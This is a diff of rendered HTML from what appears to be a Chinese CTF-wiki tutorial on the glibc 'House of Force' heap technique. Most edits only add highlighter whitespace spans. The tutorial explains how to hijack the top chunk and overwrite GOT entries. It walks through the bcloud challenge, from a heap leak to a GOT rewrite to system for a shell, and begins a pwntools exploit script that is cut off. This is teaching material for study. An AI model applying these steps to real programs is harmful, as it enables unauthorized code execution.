@@ -22,10 +22,10 @@ av-&gt;top        = remainder;
 
 /* Treat space at ptr + offset as a chunk */
 #define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))
-</code></pre></div> 之后这里会把 top 指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意值(write-anything-anywhere)。</p> <p><strong>与此同时，我们需要注意的是，topchunk的size也会更新，其更新的方法如下</strong></p> <div class=highlight><pre><span></span><code><span class=n>victim</span> <span class=o>=</span> <span class=n>av</span><span class=o>-&gt;</span><span class=n>top</span><span class=p>;</span>
-<span class=n>size</span>   <span class=o>=</span> <span class=n>chunksize</span><span class=p>(</span><span class=n>victim</span><span class=p>);</span>
-<span class=n>remainder_size</span> <span class=o>=</span> <span class=n>size</span> <span class=o>-</span> <span class=n>nb</span><span class=p>;</span>
-<span class=n>set_head</span><span class=p>(</span><span class=n>remainder</span><span class=p>,</span> <span class=n>remainder_size</span> <span class=o>|</span> <span class=n>PREV_INUSE</span><span class=p>);</span>
+</code></pre></div> 之后这里会把 top 指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意值(write-anything-anywhere)。</p> <p><strong>与此同时，我们需要注意的是，topchunk的size也会更新，其更新的方法如下</strong></p> <div class=highlight><pre><span></span><code><span class=n>victim</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>av</span><span class=o>-&gt;</span><span class=n>top</span><span class=p>;</span><span class=w></span>
+<span class=n>size</span><span class=w>   </span><span class=o>=</span><span class=w> </span><span class=n>chunksize</span><span class=p>(</span><span class=n>victim</span><span class=p>);</span><span class=w></span>
+<span class=n>remainder_size</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>size</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>nb</span><span class=p>;</span><span class=w></span>
+<span class=n>set_head</span><span class=p>(</span><span class=n>remainder</span><span class=p>,</span><span class=w> </span><span class=n>remainder_size</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>PREV_INUSE</span><span class=p>);</span><span class=w></span>
 </code></pre></div> <p>所以，如果我们想要下次在指定位置分配大小为 x 的 chunk，我们需要确保 remainder_size 不小于 x+ MINSIZE。</p> <h2 id=1>简单示例1<a class=headerlink href=#1 title="Permanent link">&para;</a></h2> <p>在学习完 HOF 的原理之后，我们这里通过一个示例来说明 HOF 的利用，这个例子的目标是通过HOF来篡改 <code>malloc@got.plt</code> 实现劫持程序流程</p> <div class=highlight><pre><span></span><code>int main()
 {
     long *ptr,*ptr2;
@@ -51,23 +51,23 @@ av-&gt;top        = remainder;
 0x7ffff7dd1b70 &lt;main_arena+80&gt;: 0x0000000000000000  0x0000000000602020 &lt;=== top chunk此时一切正常
 0x7ffff7dd1b80 &lt;main_arena+96&gt;: 0x0000000000000000  0x00007ffff7dd1b78
 </code></pre></div> 接下来我们执行<code>malloc(-4120);</code>，-4120是怎么得出的呢？ 首先，我们需要明确要写入的目的地址，这里我编译程序后，0x601020 是 <code>malloc@got.plt</code> 的地址</p> <p><div class=highlight><pre><span></span><code>0x601020:   0x00007ffff7a91130 &lt;=== malloc@got.plt
-</code></pre></div> 所以我们应该将 top chunk 指向 0x601010 处，这样当下次再分配 chunk 时，就可以分配到 <code>malloc@got.plt</code> 处的内存了。</p> <p>之后明确当前 top chunk 的地址，根据前面描述，top chunk 位于 0x602020，所以我们可以计算偏移如下</p> <p>0x601010-0x602020=-4112</p> <p>此外，用户申请的内存大小，一旦进入申请内存的函数中就变成了无符号整数。</p> <div class=highlight><pre><span></span><code><span class=kt>void</span> <span class=o>*</span><span class=nf>__libc_malloc</span><span class=p>(</span><span class=kt>size_t</span> <span class=n>bytes</span><span class=p>)</span> <span class=p>{</span>
+</code></pre></div> 所以我们应该将 top chunk 指向 0x601010 处，这样当下次再分配 chunk 时，就可以分配到 <code>malloc@got.plt</code> 处的内存了。</p> <p>之后明确当前 top chunk 的地址，根据前面描述，top chunk 位于 0x602020，所以我们可以计算偏移如下</p> <p>0x601010-0x602020=-4112</p> <p>此外，用户申请的内存大小，一旦进入申请内存的函数中就变成了无符号整数。</p> <div class=highlight><pre><span></span><code><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=nf>__libc_malloc</span><span class=p>(</span><span class=kt>size_t</span><span class=w> </span><span class=n>bytes</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w></span>
 </code></pre></div> <p>如果想要用户输入的大小经过内部的 <code>checked_request2size</code>可以得到这样的大小，即</p> <div class=highlight><pre><span></span><code><span class=cm>/*</span>
 <span class=cm>   Check if a request is so large that it would wrap around zero when</span>
 <span class=cm>   padded and aligned. To simplify some other code, the bound is made</span>
 <span class=cm>   low enough so that adding MINSIZE will also not wrap around zero.</span>
-<span class=cm> */</span>
+<span class=cm> */</span><span class=w></span>
 
 <span class=cp>#define REQUEST_OUT_OF_RANGE(req)                                              \</span>
 <span class=cp>    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span>
-<span class=cm>/* pad request bytes into a usable size -- internal version */</span>
+<span class=cm>/* pad request bytes into a usable size -- internal version */</span><span class=w></span>
 <span class=c1>//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span>
 <span class=cp>#define request2size(req)                                                      \</span>
 <span class=cp>    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span>
 <span class=cp>         ? MINSIZE                                                             \</span>
 <span class=cp>         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span>
 
-<span class=cm>/*  Same, except also perform argument check */</span>
+<span class=cm>/*  Same, except also perform argument check */</span><span class=w></span>
 
 <span class=cp>#define checked_request2size(req, sz)                                          \</span>
 <span class=cp>    if (REQUEST_OUT_OF_RANGE(req)) {                                           \</span>
@@ -82,8 +82,8 @@ av-&gt;top        = remainder;
 0x7ffff7dd1b60 &lt;main_arena+64&gt;: 0x0000000000000000  0x0000000000000000
 0x7ffff7dd1b70 &lt;main_arena+80&gt;: 0x0000000000000000  0x0000000000601010 &lt;=== 可以观察到top chunk被抬高
 0x7ffff7dd1b80 &lt;main_arena+96&gt;: 0x0000000000000000  0x00007ffff7dd1b78
-</code></pre></div> 之后，我们分配的块就会出现在 0x601010+0x10 的位置，也就是 0x601020 可以更改 got 表中的内容了。</p> <p>但是需要注意的是，在被抬高的同时，malloc@got 附近的内容也会被修改。</p> <div class=highlight><pre><span></span><code>    <span class=n>set_head</span><span class=p>(</span><span class=n>victim</span><span class=p>,</span> <span class=n>nb</span> <span class=o>|</span> <span class=n>PREV_INUSE</span> <span class=o>|</span>
-            <span class=p>(</span><span class=n>av</span> <span class=o>!=</span> <span class=o>&amp;</span><span class=n>main_arena</span> <span class=o>?</span> <span class=nl>NON_MAIN_ARENA</span> <span class=p>:</span> <span class=mi>0</span><span class=p>));</span>
+</code></pre></div> 之后，我们分配的块就会出现在 0x601010+0x10 的位置，也就是 0x601020 可以更改 got 表中的内容了。</p> <p>但是需要注意的是，在被抬高的同时，malloc@got 附近的内容也会被修改。</p> <div class=highlight><pre><span></span><code><span class=w>    </span><span class=n>set_head</span><span class=p>(</span><span class=n>victim</span><span class=p>,</span><span class=w> </span><span class=n>nb</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>PREV_INUSE</span><span class=w> </span><span class=o>|</span><span class=w></span>
+<span class=w>            </span><span class=p>(</span><span class=n>av</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=o>&amp;</span><span class=n>main_arena</span><span class=w> </span><span class=o>?</span><span class=w> </span><span class=nl>NON_MAIN_ARENA</span> <span class=p>:</span><span class=w> </span><span class=mi>0</span><span class=p>));</span><span class=w></span>
 </code></pre></div> <h2 id=2>简单示例2<a class=headerlink href=#2 title="Permanent link">&para;</a></h2> <p>在上一个示例中，我们演示了通过 HOF 使得 top chunk 的指针减小来修改位于其上面(低地址)的got表中的内容， 但是 HOF 其实也可以使得 top chunk 指针增大来修改位于高地址空间的内容，我们通过这个示例来演示这一点</p> <p><div class=highlight><pre><span></span><code>int main()
 {
     long *ptr,*ptr2;
@@ -198,45 +198,45 @@ bcloud: ELF <span class=m>32</span>-bit LSB executable, Intel <span class=m>8038
     Stack:    Canary found
     NX:       NX enabled
     PIE:      No PIE <span class=o>(</span>0x8048000<span class=o>)</span>
-</code></pre></div> <p>可以看出，这是一个动态链接的 32 位程序，主要开启了 Canary 保护与 NX 保护。</p> <h3 id=_8>基本功能<a class=headerlink href=#_8 title="Permanent link">&para;</a></h3> <p>程序大概是一个云笔记管理系统。首先，程序会进行一些初始化，设置用户的名字，组织，host。程序主要有以下几个功能</p> <ol> <li>新建note，根据用户的输入x申请x+4的空间作为note的大小。</li> <li>展示note，啥功能也没有。。</li> <li>编辑note，根据用户指定的 note 编辑对应的内容。</li> <li>删除note，删除对应note。</li> <li>同步note，标记所有的note已经被同步。</li> </ol> <p>然而在这五个功能中并没有发现啥漏洞，，，重新看程序，结果发现程序在初始化的时候出现了漏洞。。</p> <p>初始化名字</p> <div class=highlight><pre><span></span><code><span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>init_name</span><span class=p>()</span>
-<span class=p>{</span>
-  <span class=kt>char</span> <span class=n>s</span><span class=p>;</span> <span class=c1>// [esp+1Ch] [ebp-5Ch]</span>
-  <span class=kt>char</span> <span class=o>*</span><span class=n>tmp</span><span class=p>;</span> <span class=c1>// [esp+5Ch] [ebp-1Ch]</span>
-  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v3</span><span class=p>;</span> <span class=c1>// [esp+6Ch] [ebp-Ch]</span>
+</code></pre></div> <p>可以看出，这是一个动态链接的 32 位程序，主要开启了 Canary 保护与 NX 保护。</p> <h3 id=_8>基本功能<a class=headerlink href=#_8 title="Permanent link">&para;</a></h3> <p>程序大概是一个云笔记管理系统。首先，程序会进行一些初始化，设置用户的名字，组织，host。程序主要有以下几个功能</p> <ol> <li>新建note，根据用户的输入x申请x+4的空间作为note的大小。</li> <li>展示note，啥功能也没有。。</li> <li>编辑note，根据用户指定的 note 编辑对应的内容。</li> <li>删除note，删除对应note。</li> <li>同步note，标记所有的note已经被同步。</li> </ol> <p>然而在这五个功能中并没有发现啥漏洞，，，重新看程序，结果发现程序在初始化的时候出现了漏洞。。</p> <p>初始化名字</p> <div class=highlight><pre><span></span><code><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>init_name</span><span class=p>()</span><span class=w></span>
+<span class=p>{</span><span class=w></span>
+<span class=w>  </span><span class=kt>char</span><span class=w> </span><span class=n>s</span><span class=p>;</span><span class=w> </span><span class=c1>// [esp+1Ch] [ebp-5Ch]</span>
+<span class=w>  </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>tmp</span><span class=p>;</span><span class=w> </span><span class=c1>// [esp+5Ch] [ebp-1Ch]</span>
+<span class=w>  </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>v3</span><span class=p>;</span><span class=w> </span><span class=c1>// [esp+6Ch] [ebp-Ch]</span>
 
-  <span class=n>v3</span> <span class=o>=</span> <span class=n>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>);</span>
-  <span class=n>memset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x50u</span><span class=p>);</span>
-  <span class=n>puts</span><span class=p>(</span><span class=s>&quot;Input your name:&quot;</span><span class=p>);</span>
-  <span class=n>read_str</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>,</span> <span class=mi>64</span><span class=p>,</span> <span class=sc>&#39;\n&#39;</span><span class=p>);</span>
-  <span class=n>tmp</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>malloc</span><span class=p>(</span><span class=mh>0x40u</span><span class=p>);</span>
-  <span class=n>name</span> <span class=o>=</span> <span class=n>tmp</span><span class=p>;</span>
-  <span class=n>strcpy</span><span class=p>(</span><span class=n>tmp</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>s</span><span class=p>);</span>
-  <span class=n>info</span><span class=p>(</span><span class=n>tmp</span><span class=p>);</span>
-  <span class=k>return</span> <span class=n>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>)</span> <span class=o>^</span> <span class=n>v3</span><span class=p>;</span>
-<span class=p>}</span>
-</code></pre></div> <p>这里如果程序读入的名字为64个字符，那么当程序在使用info函数输出对应的字符串时，就会输出对应的tmp指针内容，也就是说<strong>泄露了堆的地址</strong>。。</p> <p>初始化组织和org的时候存在漏洞</p> <div class=highlight><pre><span></span><code><span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>init_org_host</span><span class=p>()</span>
-<span class=p>{</span>
-  <span class=kt>char</span> <span class=n>s</span><span class=p>;</span> <span class=c1>// [esp+1Ch] [ebp-9Ch]</span>
-  <span class=kt>char</span> <span class=o>*</span><span class=n>v2</span><span class=p>;</span> <span class=c1>// [esp+5Ch] [ebp-5Ch]</span>
-  <span class=kt>char</span> <span class=n>v3</span><span class=p>;</span> <span class=c1>// [esp+60h] [ebp-58h]</span>
-  <span class=kt>char</span> <span class=o>*</span><span class=n>v4</span><span class=p>;</span> <span class=c1>// [esp+A4h] [ebp-14h]</span>
-  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// [esp+ACh] [ebp-Ch]</span>
+<span class=w>  </span><span class=n>v3</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>memset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mh>0x50u</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;Input your name:&quot;</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>read_str</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=mi>64</span><span class=p>,</span><span class=w> </span><span class=sc>&#39;\n&#39;</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>tmp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>malloc</span><span class=p>(</span><span class=mh>0x40u</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>name</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>tmp</span><span class=p>;</span><span class=w></span>
+<span class=w>  </span><span class=n>strcpy</span><span class=p>(</span><span class=n>tmp</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>s</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>info</span><span class=p>(</span><span class=n>tmp</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=k>return</span><span class=w> </span><span class=n>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>)</span><span class=w> </span><span class=o>^</span><span class=w> </span><span class=n>v3</span><span class=p>;</span><span class=w></span>
+<span class=p>}</span><span class=w></span>
+</code></pre></div> <p>这里如果程序读入的名字为64个字符，那么当程序在使用info函数输出对应的字符串时，就会输出对应的tmp指针内容，也就是说<strong>泄露了堆的地址</strong>。。</p> <p>初始化组织和org的时候存在漏洞</p> <div class=highlight><pre><span></span><code><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>init_org_host</span><span class=p>()</span><span class=w></span>
+<span class=p>{</span><span class=w></span>
+<span class=w>  </span><span class=kt>char</span><span class=w> </span><span class=n>s</span><span class=p>;</span><span class=w> </span><span class=c1>// [esp+1Ch] [ebp-9Ch]</span>
+<span class=w>  </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>v2</span><span class=p>;</span><span class=w> </span><span class=c1>// [esp+5Ch] [ebp-5Ch]</span>
+<span class=w>  </span><span class=kt>char</span><span class=w> </span><span class=n>v3</span><span class=p>;</span><span class=w> </span><span class=c1>// [esp+60h] [ebp-58h]</span>
+<span class=w>  </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>v4</span><span class=p>;</span><span class=w> </span><span class=c1>// [esp+A4h] [ebp-14h]</span>
+<span class=w>  </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>v5</span><span class=p>;</span><span class=w> </span><span class=c1>// [esp+ACh] [ebp-Ch]</span>
 
-  <span class=n>v5</span> <span class=o>=</span> <span class=n>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>);</span>
-  <span class=n>memset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x90u</span><span class=p>);</span>
-  <span class=n>puts</span><span class=p>(</span><span class=s>&quot;Org:&quot;</span><span class=p>);</span>
-  <span class=n>read_str</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>,</span> <span class=mi>64</span><span class=p>,</span> <span class=mi>10</span><span class=p>);</span>
-  <span class=n>puts</span><span class=p>(</span><span class=s>&quot;Host:&quot;</span><span class=p>);</span>
-  <span class=n>read_str</span><span class=p>(</span><span class=o>&amp;</span><span class=n>v3</span><span class=p>,</span> <span class=mi>64</span><span class=p>,</span> <span class=mi>10</span><span class=p>);</span>
-  <span class=n>v4</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>malloc</span><span class=p>(</span><span class=mh>0x40u</span><span class=p>);</span>
-  <span class=n>v2</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>malloc</span><span class=p>(</span><span class=mh>0x40u</span><span class=p>);</span>
-  <span class=n>org</span> <span class=o>=</span> <span class=n>v2</span><span class=p>;</span>
-  <span class=n>host</span> <span class=o>=</span> <span class=n>v4</span><span class=p>;</span>
-  <span class=n>strcpy</span><span class=p>(</span><span class=n>v4</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v3</span><span class=p>);</span>
-  <span class=n>strcpy</span><span class=p>(</span><span class=n>v2</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>s</span><span class=p>);</span>
-  <span class=n>puts</span><span class=p>(</span><span class=s>&quot;OKay! Enjoy:)&quot;</span><span class=p>);</span>
-  <span class=k>return</span> <span class=n>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>)</span> <span class=o>^</span> <span class=n>v5</span><span class=p>;</span>
-<span class=p>}</span>
+<span class=w>  </span><span class=n>v5</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>memset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mh>0x90u</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;Org:&quot;</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>read_str</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=mi>64</span><span class=p>,</span><span class=w> </span><span class=mi>10</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;Host:&quot;</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>read_str</span><span class=p>(</span><span class=o>&amp;</span><span class=n>v3</span><span class=p>,</span><span class=w> </span><span class=mi>64</span><span class=p>,</span><span class=w> </span><span class=mi>10</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>v4</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>malloc</span><span class=p>(</span><span class=mh>0x40u</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>v2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>malloc</span><span class=p>(</span><span class=mh>0x40u</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>org</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>v2</span><span class=p>;</span><span class=w></span>
+<span class=w>  </span><span class=n>host</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>v4</span><span class=p>;</span><span class=w></span>
+<span class=w>  </span><span class=n>strcpy</span><span class=p>(</span><span class=n>v4</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>v3</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>strcpy</span><span class=p>(</span><span class=n>v2</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>s</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;OKay! Enjoy:)&quot;</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=k>return</span><span class=w> </span><span class=n>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>)</span><span class=w> </span><span class=o>^</span><span class=w> </span><span class=n>v5</span><span class=p>;</span><span class=w></span>
+<span class=p>}</span><span class=w></span>
 </code></pre></div> <p>当读入组织时，给定 64 字节，会覆盖 v2 的低地址。与此同时，我们可以知道 v2 是与 top chunk 相邻的 chunk，而 v2 恰好与 org 相邻，那么由于在 32 位程序中，一般都是 32 位全部都使用，这里 v2 所存储的内容，几乎很大程度上都不是 <code>\x00</code> ，所以当执行 strcpy 函数向 v2 中拷贝内容时，很有可能会覆盖top chunk。这就是漏洞所在。</p> <h3 id=_9>利用<a class=headerlink href=#_9 title="Permanent link">&para;</a></h3> <ol> <li>利用初始化名字处的漏洞泄漏堆的基地址。。</li> <li>利用 house of force 将 top chunk 分配至全局的 0x0804B0A0 的 &amp;notesize-8 处，当再次申请内存时，便返回notesize地址处的内存，从而我们就可以控制所有note的大小以及对应的地址了。</li> <li>修改前三个 note 的大小为16，并修改其指针为 free@got，atoi@got，atoi@got</li> <li>将 free@got 修改为 puts@plt。</li> <li>泄漏 atoi 地址。</li> <li>再次修改另外一个 atoi got 项为 system 地址，从而拿到shell。</li> </ol> <p>具体脚本如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
 <span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;gnome-terminal&#39;</span><span class=p>,</span> <span class=s1>&#39;-x&#39;</span><span class=p>,</span> <span class=s1>&#39;sh&#39;</span><span class=p>,</span> <span class=s1>&#39;-c&#39;</span><span class=p>]</span>
 <span class=k>if</span> <span class=n>args</span><span class=p>[</span><span class=s1>&#39;DEBUG&#39;</span><span class=p>]:</span>
